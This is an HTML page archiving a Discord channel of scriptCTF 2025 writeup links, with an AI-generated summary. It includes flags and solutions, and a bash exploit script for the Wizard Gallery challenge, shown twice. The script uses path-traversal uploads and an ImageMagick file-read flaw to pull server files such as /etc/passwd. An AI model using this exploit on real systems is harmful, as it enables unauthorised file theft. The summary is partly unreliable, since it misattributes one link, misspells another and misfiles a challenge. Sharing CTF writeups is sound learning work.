@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/script25/writeups_1378077092981375076.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-08-27T07:09:26.772000+00:00</span>
+      <div class="content"><a href="https://ghost-squad.github.io/posts/scriptctf-25/" target="_blank">https://ghost-squad.github.io/posts/scriptctf-25/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-24T17:38:13.157000+00:00</span>
+      <div class="content">See <a href="https://github.com/jiegec/ctf-writeups/blob/master/2025-08-16-scriptctf2025/plastic-shield-2.md" target="_blank">https://github.com/jiegec/ctf-writeups/blob/master/2025-08-16-scriptctf2025/plastic-shield-2.md</a> for details.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-24T12:10:14.622000+00:00</span>
+      <div class="content"><a href="https://github.com/jiegec/ctf-writeups/tree/master/2025-08-16-scriptctf2025" target="_blank">https://github.com/jiegec/ctf-writeups/tree/master/2025-08-16-scriptctf2025</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T16:01:15.887000+00:00</span>
+      <div class="content">Wizard Gallery Writeup (Visual/Methodology) &lt;@650421825947303966&gt; 
+<a href="https://youtu.be/BegkkkbMhIs" target="_blank">https://youtu.be/BegkkkbMhIs</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T14:15:15.489000+00:00</span>
+      <div class="content">i wrote a quick deep-dive writeup (in korean.. sorry!) Hope it helps
+
+```
+Eaas - <a href="https://pwned.tistory.com/120 " target="_blank">https://pwned.tistory.com/120 </a>
+Secure Server 2 - <a href="https://pwned.tistory.com/121 " target="_blank">https://pwned.tistory.com/121 </a>
+Plastic shield1, 2 - <a href="https://pwned.tistory.com/122" target="_blank">https://pwned.tistory.com/122</a>
+Vault 3 - <a href="https://pwned.tistory.com/123" target="_blank">https://pwned.tistory.com/123</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T11:06:05.819000+00:00</span>
+      <div class="content"><a href="https://medium.com/@D4LTON/write-up-wizard-gallery-scriptctf-783f88486a89" target="_blank">https://medium.com/@D4LTON/write-up-wizard-gallery-scriptctf-783f88486a89</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T10:04:14.821000+00:00</span>
+      <div class="content">web/wizard_gallery
+```bash
+#!/bin/bash
+
+# wipe the uploads dir
+curl -s -X POST -F 'file=@/etc/passwd;filename=image' <a href="http://play.scriptsorcerers.xyz:10273/upload" target="_blank">http://play.scriptsorcerers.xyz:10273/upload</a> &gt; /dev/null
+
+# choose which file to exfiltrate
+cargo run --quiet "$1"
+
+# trigger the resize
+curl -s -X POST -F 'file=@image.png;filename=../logo.png' <a href="http://play.scriptsorcerers.xyz:10273/upload" target="_blank">http://play.scriptsorcerers.xyz:10273/upload</a> &gt; /dev/null
+
+# save the image W/exfiltrated data
+curl -s <a href="http://play.scriptsorcerers.xyz:10273/logo-sm.png" target="_blank">http://play.scriptsorcerers.xyz:10273/logo-sm.png</a> &gt; ~/logo-sm.png
+
+# retrieve the exfiltrated data from the downloaded image
+identify -verbose ~/logo-sm.png \
+  | awk '/Raw profile type:/,/signature:/' \
+  # | grep -E '^[0-9a-z]' \
+  # | tr -d '\n' \
+  # | python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode(errors='ignore'))"
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T08:39:13.899000+00:00</span>
+      <div class="content"><a href="https://medium.com/@parvbajaj2000/exploiting-hidden-developer-route-for-cookie-based-authentication-63ffbc00a454" target="_blank">https://medium.com/@parvbajaj2000/exploiting-hidden-developer-route-for-cookie-based-authentication-63ffbc00a454</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T08:38:30.505000+00:00</span>
+      <div class="content"><a href="https://medium.com/@parvbajaj2000/wizard-gallery-ctf-exploiting-imagemagick-cve-2022-44268-for-arbitrary-file-read-c82a4c71056e?source=friends_link&amp;sk=91b0fe2349dfc049a290dd07b98cc326" target="_blank">https://medium.com/@parvbajaj2000/wizard-gallery-ctf-exploiting-imagemagick-cve-2022-44268-for-arbitrary-file-read-c82a4c71056e?source=friends_link&amp;sk=91b0fe2349dfc049a290dd07b98cc326</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T08:09:45.297000+00:00</span>
+      <div class="content">Wizard Gallery
+<a href="https://github.com/1aadiez/CTF-Writeups/blob/main/scriptCTF2025/Wizard%20Gallery.md" target="_blank">https://github.com/1aadiez/CTF-Writeups/blob/main/scriptCTF2025/Wizard%20Gallery.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T06:22:40.336000+00:00</span>
+      <div class="content"><a href="https://d3let3-57.github.io/posts/vault3/" target="_blank">https://d3let3-57.github.io/posts/vault3/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T06:19:26.429000+00:00</span>
+      <div class="content">Detailed writeup for misc/modulo: <a href="https://hxuu.github.io/blog/ctf/script25/modulo/" target="_blank">https://hxuu.github.io/blog/ctf/script25/modulo/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T04:36:19.901000+00:00</span>
+      <div class="content"><a href="https://wrenches.online/modulo.html" target="_blank">https://wrenches.online/modulo.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T00:35:19.722000+00:00</span>
+      <div class="content"><a href="https://cold.is-a.dev/blog/scriptctf2025/" target="_blank">https://cold.is-a.dev/blog/scriptctf2025/</a> (modulo writeup)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T00:30:09.856000+00:00</span>
+      <div class="content"><a href="https://github.com/MashaMWolf/scriptCTF-Writeups/tree/main/OSINT" target="_blank">https://github.com/MashaMWolf/scriptCTF-Writeups/tree/main/OSINT</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-21T00:11:10.405000+00:00</span>
+      <div class="content">solution for all osint challenges : <a href="https://medium.com/@nikitha7390/scriptctf-osint-challenges-writeup-69a58d96737d" target="_blank">https://medium.com/@nikitha7390/scriptctf-osint-challenges-writeup-69a58d96737d</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-20T23:22:00.034000+00:00</span>
+      <div class="content">`Forensics - Off By One` brief solution: <a href="https://tommy-kay.github.io/posts/scriptCTF2025-Forensics-OffByOne/" target="_blank">https://tommy-kay.github.io/posts/scriptCTF2025-Forensics-OffByOne/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-20T19:57:51.887000+00:00</span>
+      <div class="content"><a href="https://andwati.xyz/posts/scriptctf2025/" target="_blank">https://andwati.xyz/posts/scriptctf2025/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-20T09:55:54.784000+00:00</span>
+      <div class="content"><a href="https://thienguen.gitbook.io/ctf-writeups/2025/scriptctf" target="_blank">https://thienguen.gitbook.io/ctf-writeups/2025/scriptctf</a>
+
+I guess we will have to wait a bit more, till the form and the embargo to be lift.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-20T05:41:27.613000+00:00</span>
+      <div class="content"><a href="https://devbhalavat.github.io/posts/scriptctf25/" target="_blank">https://devbhalavat.github.io/posts/scriptctf25/</a>
+
+A bit late, but unintended forensics 🙂</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-20T01:07:02.806000+00:00</span>
+      <div class="content"><a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-subtract/" target="_blank">https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-subtract/</a>
+<a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-div-2/" target="_blank">https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-div-2/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-19T00:29:19.961000+00:00</span>
+      <div class="content"><a href="https://0x3xpl0it3r.github.io/posts/scriptctf-2025/" target="_blank">https://0x3xpl0it3r.github.io/posts/scriptctf-2025/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T21:22:18.277000+00:00</span>
+      <div class="content">nope <a href="https://discord.com/channels/921997027057999954/921997292108648458/1406792362021359639" target="_blank">https://discord.com/channels/921997027057999954/921997292108648458/1406792362021359639</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T17:33:10.741000+00:00</span>
+      <div class="content">```Misc/Modulo
+Forensics/Off-By-One
+Web/Wizard Gallery
+OSINT/The Insider 4
+Programming/BackFromWhere
+Pwn/Vault3
+Rev/VM2
+Blockchain/Auction (please solve it already smh)
+
+DO NOT POST WRITEUPS FOR THE ABOVE CHALLENGES```
+<a href="https://discord.com/channels/921997027057999954/921997292108648458/1406792362021359639" target="_blank">https://discord.com/channels/921997027057999954/921997292108648458/1406792362021359639</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T16:44:31.049000+00:00</span>
+      <div class="content"><a href="https://saanrhyne.com/posts/avocado-writeup/" target="_blank">https://saanrhyne.com/posts/avocado-writeup/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T15:52:26.061000+00:00</span>
+      <div class="content"><a href="https://medium.com/@iynm/scriptctf-2025-forensics-misc-5ec51dd61aca" target="_blank">https://medium.com/@iynm/scriptctf-2025-forensics-misc-5ec51dd61aca</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T12:46:31.859000+00:00</span>
+      <div class="content"><a href="https://www.notion.so/Script-CTF-2025-write-up-2537c1cedeb08086b692deae14c33387?source=copy_link" target="_blank">https://www.notion.so/Script-CTF-2025-write-up-2537c1cedeb08086b692deae14c33387?source=copy_link</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T11:54:20.136000+00:00</span>
+      <div class="content"><a href="https://medium.com/@suleif/scriptctf2025-vm-writeup-1f38074d7b77" target="_blank">https://medium.com/@suleif/scriptctf2025-vm-writeup-1f38074d7b77</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T10:44:56.896000+00:00</span>
+      <div class="content"><a href="https://medium.com/@alinboby/script-ctf-2025-secure-server-2-crypto-write-up-7582f421208a" target="_blank">https://medium.com/@alinboby/script-ctf-2025-secure-server-2-crypto-write-up-7582f421208a</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T09:02:38.534000+00:00</span>
+      <div class="content"><a href="https://medium.com/@zeyadsalah686/scriptctf-pwn-index-249ffc4eaa87" target="_blank">https://medium.com/@zeyadsalah686/scriptctf-pwn-index-249ffc4eaa87</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T05:42:42.764000+00:00</span>
+      <div class="content"><a href="https://sevcankazdag.com.tr/scriptctf-writeups-series-div/" target="_blank">https://sevcankazdag.com.tr/scriptctf-writeups-series-div/</a>   <a href="https://sevcankazdag.com.tr/scriptctf-writeups-series-emoji/" target="_blank">https://sevcankazdag.com.tr/scriptctf-writeups-series-emoji/</a>   <a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-enchant/" target="_blank">https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-enchant/</a>    it wiil be countinue</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T02:26:59.816000+00:00</span>
+      <div class="content">Index-2
+<a href="https://medium.com/@nomanprodhan/scriptctf-2025-index-2-pwn-writeup-6-byte-leak-7-byte-swap-to-flag-9f82cf577d0a" target="_blank">https://medium.com/@nomanprodhan/scriptctf-2025-index-2-pwn-writeup-6-byte-leak-7-byte-swap-to-flag-9f82cf577d0a</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T01:27:28.597000+00:00</span>
+      <div class="content"><a href="https://medium.com/@nomanprodhan/scriptctf-2025-pwn-index-pie-resilient-oob-read-via-hidden-1337-flag-loader-0a264dc4b9c9" target="_blank">https://medium.com/@nomanprodhan/scriptctf-2025-pwn-index-pie-resilient-oob-read-via-hidden-1337-flag-loader-0a264dc4b9c9</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T01:21:34.223000+00:00</span>
+      <div class="content"><a href="https://github.com/0xt4req/ScriptCTF-writeup/tree/main/OSINT" target="_blank">https://github.com/0xt4req/ScriptCTF-writeup/tree/main/OSINT</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:39:04.880000+00:00</span>
+      <div class="content"><a href="https://github.com/scriptCTF/scriptCTF2025-OfficialWriteups/tree/main/Programming" target="_blank">https://github.com/scriptCTF/scriptCTF2025-OfficialWriteups/tree/main/Programming</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:38:54.793000+00:00</span>
+      <div class="content">write up here: <a href="https://ctf.krauq.com/scriptctf-2025#just-some-avocado-353-solves" target="_blank">https://ctf.krauq.com/scriptctf-2025#just-some-avocado-353-solves</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:25:27.978000+00:00</span>
+      <div class="content">Crypto/Mod writeup
+```
+<a href="https://storage.googleapis.com/scriptctf-wave2-randomchars1337/Crypto/Mod/chall.py" target="_blank">https://storage.googleapis.com/scriptctf-wave2-randomchars1337/Crypto/Mod/chall.py</a> 
+
+Looking at the code, it first generates a random number, and prints the remainder when the first input is divided by the secret number. 
+
+To figure out exactly what the secret number is, we can first input -1. Then, we add 1 to the result to figure out the secret number. 
+
+This works because the closest multiple of the secret number, or s, that is less than or equal to -1 is -s. Therefore, the output will be the difference between those two numbers, which is s-1. 
+
+Now, just input the secret number, and you will get your flag. scriptCTF{-1_f0r_7h3_w1n_4a3f7db1_585246562a46}
+```
+
+(idk how this is crypto)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:25:24.362000+00:00</span>
+      <div class="content">Here are my writeups again.
+<a href="https://ctf.krauq.com/scriptctf-2025" target="_blank">https://ctf.krauq.com/scriptctf-2025</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:22:06.553000+00:00</span>
+      <div class="content">```Ok so the avocado is actually an encrypted zip
+Using <a href="https://github.com/agourlay/zip-password-finder" target="_blank">https://github.com/agourlay/zip-password-finder</a> and rockyou.txt,
+I find the password for the avocado is impassive3428
+This gives us staticnoise.wav, justsomezip.zip
+Justsomezip.zip cannot be cracked w rockyou
+Uploading staticnoise.wav into audacity and switch it into spectogram
+Shows “d41v3ron”
+Using that as the file unzip justsomezip.zip
+Flag is scriptCTF{1_l0ve_d41_v3r0n}
+``` I will post a more detailed writeup later</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:19:28.295000+00:00</span>
+      <div class="content"><a href="https://docs.google.com/document/d/1RghhVgIw3V_byZXzuO30dFxxeEk3X5ZvLIe1U66F9IM/edit?usp=sharing" target="_blank">https://docs.google.com/document/d/1RghhVgIw3V_byZXzuO30dFxxeEk3X5ZvLIe1U66F9IM/edit?usp=sharing</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-18T00:15:41.625000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/921997027057999954/1378077092981375076/1406793277554032700" target="_blank">https://discord.com/channels/921997027057999954/1378077092981375076/1406793277554032700</a></div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+```html
+<div class="summary-container" style="font-family: sans-serif; line-height: 1.6;">
+    <h2>scriptCTF 2025 Write-up &amp; Solution Compilation</h2>
+    <p>This document summarizes a collection of links, solutions, and discussions related to the scriptCTF 2025 Capture The Flag event. The content is aggregated from a chat conversation and organized by challenge category.</p>
+
+    <blockquote style="border-left: 4px solid #ccc; padding-left: 1em; margin-left: 0; font-style: italic; color: #555;">
+        <p><strong>Embargo Notice:</strong> At the time of the conversation, there was a request to withhold posting write-ups for the following challenges:</p>
+        <ul>
+            <li>Misc/Modulo</li>
+            <li>Forensics/Off-By-One</li>
+            <li>Web/Wizard Gallery</li>
+            <li>OSINT/The Insider 4</li>
+            <li>Programming/BackFromWhere</li>
+            <li>Pwn/Vault3</li>
+            <li>Rev/VM2</li>
+            <li>Blockchain/Auction</li>
+        </ul>
+    </blockquote>
+
+    <h3>General &amp; Multi-Challenge Collections</h3>
+    <ul>
+        <li><a href="https://ghost-squad.github.io/posts/scriptctf-25/" target="_blank">Ghost Squad - scriptCTF 25</a></li>
+        <li><a href="https://github.com/jiegec/ctf-writeups/tree/master/2025-08-16-scriptctf2025" target="_blank">Jiegec CTF Write-ups (Plastic Shield 2)</a></li>
+        <li><a href="https://pwned.tistory.com/" target="_blank">Korean Write-ups (Eaas, Secure Server 2, Plastic Shield 1/2, Vault 3)</a></li>
+        <li><a href="https://andwati.xyz/posts/scriptctf2025/" target="_blank">Andwati's Write-ups</a></li>
+        <li><a href="https://thienguen.gitbook.io/ctf-writeups/2025/scriptctf/" target="_blank">Thien Guen's CTF Write-ups</a></li>
+        <li><a href="https://devbhalavat.github.io/posts/scriptctf25/" target="_blank">Dev Bhalavat's Write-ups</a></li>
+        <li><a href="https://0x3xpl0it3r.github.io/posts/scriptctf-2025/" target="_blank">0x3xpl0it3r's Write-ups</a></li>
+        <li><a href="https://medium.com/@iynm/scriptctf-2025-forensics-misc-5ec51dd61aca" target="_blank">Medium: Forensics &amp; Misc Write-ups by iynm</a></li>
+        <li><a href="https://www.notion.so/Script-CTF-2025-write-up-2537c1cedeb08086b692deae14c33387?source=copy_link" target="_blank">Notion: Script CTF 2025 Write-up</a></li>
+        <li><a href="https://ctf.krauq.com/scriptctf-2025" target="_blank">Krauq's CTF Write-ups (including Just Some Avocado)</a></li>
+        <li>Sevcankazdag Series:
+            <ul>
+                <li><a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-subtract/" target="_blank">Subtract</a></li>
+                <li><a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-div-2/" target="_blank">Div 2</a></li>
+                <li><a href="https://sevcankazdag.com.tr/scriptctf-writeups-series-div/" target="_blank">Div</a></li>
+                <li><a href="https://sevcankazdag.com.tr/scriptctf-writeups-series-emoji/" target="_blank">Emoji</a></li>
+                <li><a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-enchant/" target="_blank">Enchant</a></li>
+            </ul>
+        </li>
+    </ul>
+
+    <hr>
+
+    <h3>Web</h3>
+    <h4>Wizard Gallery</h4>
+    <ul>
+        <li><a href="https://youtu.be/BegkkkbMhIs" target="_blank">YouTube: Wizard Gallery Writeup (Visual/Methodology)</a></li>
+        <li><a href="https://medium.com/@D4LTON/write-up-wizard-gallery-scriptctf-783f88486a89" target="_blank">Medium Write-up by D4LTON</a></li>
+        <li><a href="https://medium.com/@parvbaj2000/wizard-gallery-ctf-exploiting-imagemagick-cve-2022-44268-for-arbitrary-file-read-c82a4c71056e?source=friends_link&sk=91b0fe2349dfc049a290dd07b98cc326" target="_blank">Medium: Exploiting ImageMagick CVE-2022-44268 by Parv Bajaj</a></li>
+        <li><a href="https://github.com/1aadiez/CTF-Writeups/blob/main/scriptCTF2025/Wizard%20Gallery.md" target="_blank">GitHub Write-up by 1aadiez</a></li>
+        <li><strong>Exploit Script:</strong>
+            <pre style="background-color: #f4f4f4; border: 1px solid #ddd; padding: 1em; white-space: pre-wrap;"><code>#!/bin/bash
+
+# wipe the uploads dir
+curl -s -X POST -F 'file=@/etc/passwd;filename=image' http://play.scriptsorcerers.xyz:10273/upload > /dev/null
+
+# choose which file to exfiltrate
+cargo run --quiet "$1"
+
+# trigger the resize
+curl -s -X POST -F 'file=@image.png;filename=../logo.png' http://play.scriptsorcerers.xyz:10273/upload > /dev/null
+
+# save the image W/exfiltrated data
+curl -s http://play.scriptsorcerers.xyz:10273/logo-sm.png > ~/logo-sm.png
+
+# retrieve the exfiltrated data from the downloaded image
+identify -verbose ~/logo-sm.png \
+  | awk '/Raw profile type:/,/signature:/' \
+  # | grep -E '^[0-9a-z]' \
+  # | tr -d '\n' \
+  # | python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode(errors='ignore'))"</code></pre>
+        </li>
+    </ul>
+    <h4>Secure Server 2</h4>
+    <ul>
+        <li><a href="https://pwned.tistory.com/121" target="_blank">pwned.tistory.com/121</a> (Korean)</li>
+        <li><a href="https://medium.com/@alinboby/script-ctf-2025-secure-server-2-crypto-write-up-7582f421208a" target="_blank">Medium: Secure Server 2 Crypto Write-up by Alin Boby</a></li>
+    </ul>
+    <h4>Other Web</h4>
+    <ul>
+        <li><a href="https://medium.com/@parvbaj2000/exploiting-hidden-developer-route-for-cookie-based-authentication-63ffbc00a454" target="_blank">Medium: Exploiting Hidden Developer Route for Cookie-Based Authentication</a></li>
+    </ul>
+
+    <hr>
+
+    <h3>Crypto</h3>
+    <h4>Mod</h4>
+    <p>A detailed solution was provided directly:</p>
+    <pre style="background-color: #f4f4f4; border: 1px solid #ddd; padding: 1em; white-space: pre-wrap;"><code>
+Looking at the code, it first generates a random number, and prints the remainder when the first input is divided by the secret number.
+
+To figure out exactly what the secret number is, we can first input -1. Then, we add 1 to the result to figure out the secret number.
+
+This works because the closest multiple of the secret number, or s, that is less than or equal to -1 is -s. Therefore, the output will be the difference between those two numbers, which is s-1.
+
+Now, just input the secret number, and you will get your flag.
+scriptCTF{-1_f0r_7h3_w1n_4a3f7db1_585246562a46}
+</code></pre>
+    <h4>Eaas</h4>
+    <ul>
+        <li><a href="https://pwned.tistory.com/120" target="_blank">pwned.tistory.com/120</a> (Korean)</li>
+    </ul>
+
+    <hr>
+
+    <h3>Forensics</h3>
+    <h4>Off By One</h4>
+    <ul>
+        <li><a href="https://tommy-kay.github.io/posts/scriptCTF2025-Forensics-OffByOne/" target="_blank">Brief Solution by Tommy Kay</a></li>
+        <li><a href="https://sevcankazdag.com.tr/scriptctf-2025-writeups-series-subtract/" target="_blank">Unintended Forensics Solution</a></li>
+    </ul>
+    <h4>Just Some Avocado (Misc/Forensics)</h4>
+    <p>A detailed solution was provided directly:</p>
+    <pre style="background-color: #f4f4f4; border: 1px solid #ddd; padding: 1em; white-space: pre-wrap;"><code>
+1. The avocado is an encrypted zip file.
+2. Use a zip password finder (e.g., https://github.com/agourlay/zip-password-finder) with rockyou.txt.
+3. The password found is "impassive3428".
+4. This extracts "staticnoise.wav" and "justsomezip.zip".
+5. "justsomezip.zip" cannot be cracked with rockyou.txt.
+6. Open "staticnoise.wav" in Audacity and switch to spectrogram view.
+7. The spectrogram shows the text "d41v3ron".
+8. Use "d41v3ron" as the password to unzip "justsomezip.zip".
+9. Flag: scriptCTF{1_l0ve_d41_v3r0n}
+</code></pre>
+    <ul>
+        <li><a href="https://saanrhyne.com/posts/avocado-writeup/" target="_blank">Saan Rhyne's Avocado Write-up</a></li>
+    </ul>
+
+    <hr>
+
+    <h3>Pwn</h3>
+    <h4>Vault3</h4>
+    <ul>
+        <li><a href="https://pwned.tistory.com/123" target="_blank">pwned.tistory.com/123</a> (Korean)</li>
+        <li><a href="https://d3let3-57.github.io/posts/vault3/" target="_blank">d3let3-57's Vault3 Write-up</a></li>
+    </ul>
+    <h4>Index / Index-2</h4>
+    <ul>
+        <li><a href="https://medium.com/@zeyadsalah686/scriptctf-pwn-index-249ffc4eaa87" target="_blank">Medium: Pwn Index by Zeyad Salah</a></li>
+        <li><a href="https://medium.com/@nomanprodhan/scriptctf-2025-index-2-pwn-writeup-6-byte-leak-7-byte-swap-to-flag-9f82cf577d0a" target="_blank">Medium: Index-2 (6 byte leak, 7 byte swap) by Noman Prodhan</a></li>
+        <li><a href="https://medium.com/@nomanprodhan/scriptctf-2025-pwn-index-pie-resilient-oob-read-via-hidden-1337-flag-loader-0a264dc4b9c9" target="_blank">Medium: Index (PIE resilient OOB read) by Noman Prodhan</a></li>
+    </ul>
+
+    <hr>
+
+    <h3>Misc</h3>
+    <h4>Modulo</h4>
+    <ul>
+        <li><a href="https://hxuu.github.io/blog/ctf/script25/modulo/" target="_blank">Detailed writeup by hxuu</a></li>
+        <li><a href="https://wrenches.online/modulo.html" target="_blank">wrenches.online/modulo.html</a></li>
+        <li><a href="https://cold.is-a.dev/blog/scriptctf2025/" target="_blank">cold.is-a.dev Modulo Write-up</a></li>
+    </ul>
+    <h4>Plastic Shield 1 &amp; 2</h4>
+    <ul>
+        <li><a href="https://pwned.tistory.com/122" target="_blank">pwned.tistory.com/122</a> (Korean)</li>
+    </ul>
+
+    <hr>
+
+    <h3>OSINT</h3>
+    <ul>
+        <li><a href="https://github.com/MashaMWolf/scriptCTF-Writeups/tree/main/OSINT" target="_blank">GitHub OSINT Solutions by MashaMWolf</a></li>
+        <li><a href="https://medium.com/@nikitha7390/scriptctf-osint-challenges-writeup-69a58d96737d" target="_blank">Medium: OSINT Challenges Write-up by Nikitha</a></li>
+        <li><a href="https://github.com/0xt4req/ScriptCTF-writeup/tree/main/OSINT" target="_blank">GitHub OSINT Solutions by 0xt4req</a></li>
+    </ul>
+
+    <hr>
+
+    <h3>Reverse Engineering (Rev)</h3>
+    <h4>VM Write-up</h4>
+    <ul>
+        <li><a href="https://medium.com/@suleif/scriptctf2025-vm-writeup-1f38074d7b77" target="_blank">Medium: VM Write-up by suleif</a></li>
+    </ul>
+
+    <hr>
+
+    <h3>Programming</h3>
+    <ul>
+        <li><a href="https://github.com/scriptCTF/scriptCTF2025-OfficialWriteups/tree/main/Programming" target="_blank">Official Programming Write-ups</a></li>
+    </ul>
+
+</div>
+```
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
